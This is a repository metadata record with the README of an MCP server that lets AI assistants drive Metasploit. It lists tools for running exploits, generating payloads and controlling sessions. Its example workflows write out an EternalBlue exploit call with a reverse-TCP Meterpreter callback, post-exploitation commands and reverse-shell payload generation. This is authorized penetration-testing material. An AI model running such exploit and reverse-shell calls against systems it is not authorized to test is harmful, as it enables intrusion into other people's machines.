{
  "mcp_name": "GH05TCREW/MetasploitMCP",
  "mcp_description": "Facilitates AI-driven interaction with Metasploit for dynamic security testing and exploitation workflows.",
  "mcp_id": "GH05TCREW_MetasploitMCP",
  "fetch_timestamp": "2025-06-23T03:45:58.420854Z",
  "github_url": "https://github.com/GH05TCREW/MetasploitMCP",
  "repository": {
    "name": "MetasploitMCP",
    "full_name": "GH05TCREW/MetasploitMCP",
    "description": "MCP Server for Metasploit",
    "html_url": "https://github.com/GH05TCREW/MetasploitMCP",
    "created_at": "2025-04-13T23:57:28Z",
    "updated_at": "2025-06-22T23:38:42Z",
    "pushed_at": "2025-05-29T22:37:03Z",
    "size": 165,
    "stargazers_count": 50,
    "watchers_count": 50,
    "forks_count": 6,
    "open_issues_count": 0,
    "language": "Python",
    "license": "Apache License 2.0",
    "topics": [],
    "default_branch": "main",
    "owner": {
      "login": "GH05TCREW",
      "type": "User",
      "avatar_url": "https://avatars.githubusercontent.com/u/183985551?v=4",
      "html_url": "https://github.com/GH05TCREW"
    },
    "has_issues": true,
    "has_projects": true,
    "has_downloads": true,
    "has_wiki": true,
    "has_pages": false,
    "archived": false,
    "disabled": false,
    "visibility": "public",
    "network_count": 6,
    "subscribers_count": 3,
    "languages": {
      "Python": 77039
    },
    "language_percentages": {
      "Python": 100
    },
    "pull_requests_count": 0,
    "contributors_count": 1
  },
  "readme": "# Metasploit MCP Server\n\nA Model Context Protocol (MCP) server for Metasploit Framework integration.\n\n\nhttps://github.com/user-attachments/assets/39b19fb5-8397-4ccd-b896-d1797ec185e1\n\n\n## Description\n\nThis MCP server provides a bridge between large language models like Claude and the Metasploit Framework penetration testing platform. It allows AI assistants to dynamically access and control Metasploit functionality through standardized tools, enabling a natural language interface to complex security testing workflows.\n\n## Features\n\n### Module Information\n\n- **list_exploits**: Search and list available Metasploit exploit modules\n- **list_payloads**: Search and list available Metasploit payload modules with optional platform and architecture filtering\n\n### Exploitation Workflow\n\n- **run_exploit**: Configure and execute an exploit against a target with options to run checks first\n- **run_auxiliary_module**: Run any Metasploit auxiliary module with custom options\n- **run_post_module**: Execute post-exploitation modules against existing sessions\n\n### Payload Generation\n\n- **generate_payload**: Generate payload files using Metasploit RPC (saves files locally)\n\n### Session Management\n\n- **list_active_sessions**: Show current Metasploit sessions with detailed information\n- **send_session_command**: Run a command in an active shell or Meterpreter session\n- **terminate_session**: Forcefully end an active session\n\n### Handler Management\n\n- **list_listeners**: Show all active handlers and background jobs\n- **start_listener**: Create a new multi/handler to receive connections\n- **stop_job**: Terminate any running job or handler\n\n## Prerequisites\n\n- Metasploit Framework installed and msfrpcd running\n- Python 3.10 or higher\n- Required Python packages (see requirements.txt)\n\n## Installation\n\n1. Clone this repository\n2. Install dependencies:\n   ```\n   pip install -r requirements.txt\n   ```\n3. Configure environment variables (optional):\n   ```\n   MSF_PASSWORD=yourpassword\n   MSF_SERVER=127.0.0.1\n   MSF_PORT=55553\n   MSF_SSL=false\n   PAYLOAD_SAVE_DIR=/path/to/save/payloads  # Optional: Where to save generated payloads\n   ```\n\n## Usage\n\nStart the Metasploit RPC service:\n\n```bash\nmsfrpcd -P yourpassword -S -a 127.0.0.1 -p 55553\n```\n\n### Transport Options\n\nThe server supports two transport methods:\n\n- **HTTP/SSE (Server-Sent Events)**: Default mode for interoperability with most MCP clients\n- **STDIO (Standard Input/Output)**: Used with Claude Desktop and similar direct pipe connections\n\nYou can explicitly select the transport mode using the `--transport` flag:\n\n```bash\n# Run with HTTP/SSE transport (default)\npython MetasploitMCP.py --transport http\n\n# Run with STDIO transport\npython MetasploitMCP.py --transport stdio\n```\n\nAdditional options for HTTP mode:\n```bash\npython MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085\n```\n\n### Claude Desktop Integration\n\nFor Claude Desktop integration, configure `claude_desktop_config.json`:\n\n```json\n{\n    \"mcpServers\": {\n        \"metasploit\": {\n            \"command\": \"uv\",\n            \"args\": [\n                \"--directory\",\n                \"C:\\\\path\\\\to\\\\MetasploitMCP\",\n                \"run\",\n                \"MetasploitMCP.py\",\n                \"--transport\",\n                \"stdio\"\n            ],\n            \"env\": {\n                \"MSF_PASSWORD\": \"yourpassword\"\n            }\n        }\n    }\n}\n```\n\n### Other MCP Clients\n\nFor other MCP clients that use HTTP/SSE:\n\n1. Start the server in HTTP mode:\n   ```bash\n   python MetasploitMCP.py --transport http --host 0.0.0.0 --port 8085\n   ```\n\n2. Configure your MCP client to connect to:\n   - SSE endpoint: `http://your-server-ip:8085/sse`\n\n## Security Considerations\n\n⚠️ **IMPORTANT SECURITY WARNING**:\n\nThis tool provides direct access to Metasploit Framework capabilities, which include powerful exploitation features. Use responsibly and only in environments where you have explicit permission to perform security testing.\n\n- Always validate and review all commands before execution\n- Only run in segregated test environments or with proper authorization\n- Be aware that post-exploitation commands can result in significant system modifications\n\n## Example Workflows\n\n### Basic Exploitation\n\n1. List available exploits: `list_exploits(\"ms17_010\")`\n2. Select and run an exploit: `run_exploit(\"exploit/windows/smb/ms17_010_eternalblue\", {\"RHOSTS\": \"192.168.1.100\"}, \"windows/x64/meterpreter/reverse_tcp\", {\"LHOST\": \"192.168.1.10\", \"LPORT\": 4444})`\n3. List sessions: `list_active_sessions()`\n4. Run commands: `send_session_command(1, \"whoami\")`\n\n### Post-Exploitation\n\n1. Run a post module: `run_post_module(\"windows/gather/enum_logged_on_users\", 1)`\n2. Send custom commands: `send_session_command(1, \"sysinfo\")`\n3. Terminate when done: `terminate_session(1)`\n\n### Handler Management\n\n1. Start a listener: `start_listener(\"windows/meterpreter/reverse_tcp\", \"192.168.1.10\", 4444)`\n2. List active handlers: `list_listeners()`\n3. Generate a payload: `generate_payload(\"windows/meterpreter/reverse_tcp\", \"exe\", {\"LHOST\": \"192.168.1.10\", \"LPORT\": 4444})`\n4. Stop a handler: `stop_job(1)`\n\n## Configuration Options\n\n### Payload Save Directory\n\nBy default, payloads generated with `generate_payload` are saved to a `payloads` directory in your home folder (`~/payloads` or `C:\\Users\\YourUsername\\payloads`). You can customize this location by setting the `PAYLOAD_SAVE_DIR` environment variable.\n\n**Setting the environment variable:**\n\n- **Windows (PowerShell)**:\n  ```powershell\n  $env:PAYLOAD_SAVE_DIR = \"C:\\custom\\path\\to\\payloads\"\n  ```\n\n- **Windows (Command Prompt)**:\n  ```cmd\n  set PAYLOAD_SAVE_DIR=C:\\custom\\path\\to\\payloads\n  ```\n\n- **Linux/macOS**:\n  ```bash\n  export PAYLOAD_SAVE_DIR=/custom/path/to/payloads\n  ```\n\n- **In Claude Desktop config**:\n  ```json\n  \"env\": {\n      \"MSF_PASSWORD\": \"yourpassword\",\n      \"PAYLOAD_SAVE_DIR\": \"C:\\\\your\\\\actual\\\\path\\\\to\\\\payloads\"  // Only add if you want to override the default\n  }\n  ```\n\n**Note:** If you specify a custom path, make sure it exists or the application has permission to create it. If the path is invalid, payload generation might fail.\n\n## License\n\nApache 2.0\n"
}